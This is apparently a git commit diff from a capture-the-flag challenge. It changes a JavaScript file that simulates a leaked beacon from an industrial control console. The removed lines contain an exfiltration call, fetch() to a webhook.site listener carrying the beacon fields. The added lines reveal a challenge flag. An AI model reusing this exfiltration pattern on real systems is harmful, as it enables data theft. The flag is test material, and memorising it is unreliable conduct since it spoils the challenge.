2ae3c3779398250160d54b1d479c5cd401753dab
Fake-Cake1 <atharvapol00@gmail.com>
2025-06-28 16:08:20 -0400

    Infected payload

--- init.js
+++ init.js
@@ -1,13 +1,9 @@
-// Simulated beacon leak from ICS Console
-const beacon = {
-  operator: "readonly_user_14",
-  control_zone: "WTR-GATE-03-A",
-  node_status: "pending",
-  session_id: "O-TX-11-403"
+var beacon = {
+  session_id: "O-TX-11-403",
+  fallback_dns: "uplink-fallback.virelia-water.it.com",
+  token: "JBSWY3DPEBLW64TMMQQQ=="
 };
 
-// Send data to your webhook listener
-fetch("https://webhook.site/0708085b-bf76-4caa-9a16-b0991ebd0c51?" + new URLSearchParams(beacon));
-
-// Optional: show a message to prove JS runs
-alert("⚠️ ICS Console Beacon Leaked!");
+if (beacon.token === "JBSWY3DPEBLW64TMMQQQ==") {
+  document.querySelector('.warning').innerText = "THM{this_is_the_real_flag}";
+}
